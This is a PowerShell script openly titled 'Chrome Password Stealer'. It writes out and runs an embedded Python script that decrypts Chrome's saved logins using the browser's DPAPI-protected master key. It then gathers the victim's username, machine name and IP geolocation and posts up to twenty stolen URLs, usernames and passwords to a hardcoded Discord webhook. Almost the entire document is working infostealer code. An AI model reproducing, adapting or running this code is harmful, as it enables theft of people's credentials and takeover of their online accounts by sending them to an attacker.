# Chrome Password Stealer - Based on proven method

Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan

# Python script based on working repo
$pythonScript = @'
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return ""

def main():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    
    # Copy to temp
    shutil.copy2(login_db, "Loginvault.db")
    
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    
    results = []
    
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if decrypted_password:
                    results.append({
                        "url": url,
                        "username": username,
                        "password": decrypted_password
                    })
    except Exception as e:
        pass
    
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    
    print(json.dumps(results))

if __name__ == '__main__':
    main()
'@

$scriptPath = "$env:TEMP\decrypt_chrome.py"
$pythonScript | Out-File $scriptPath -Encoding UTF8

Write-Host "Installing dependencies..." -ForegroundColor Yellow
python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null

Write-Host "Extracting passwords..." -ForegroundColor Yellow
$output = python $scriptPath 2>&1 | Out-String

try {
    $passwords = $output | ConvertFrom-Json
    
    if (-not $passwords -or $passwords.Count -eq 0) {
        Write-Host "No passwords found or extraction failed!" -ForegroundColor Red
        Write-Host "Debug output:" -ForegroundColor Yellow
        Write-Host $output
        Read-Host "Press Enter"
        exit
    }
    
    Write-Host "Found $($passwords.Count) passwords!" -ForegroundColor Green
    
    # Get system info
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    # Format for Discord
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords ($($passwords.Count)):**$passText
"@
    
    # Send to Discord
    Write-Host "Sending to Discord..." -ForegroundColor Yellow
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
    Write-Host "Sent!" -ForegroundColor Green
    
    # Save locally
    $outFile = "$env:USERPROFILE\Desktop\passwords.txt"
    $passwords | ConvertTo-Json | Out-File $outFile
    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
    
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Output was:" -ForegroundColor Yellow
    Write-Host $output
}

Remove-Item $scriptPath -ErrorAction SilentlyContinue
Read-Host "Press Enter"
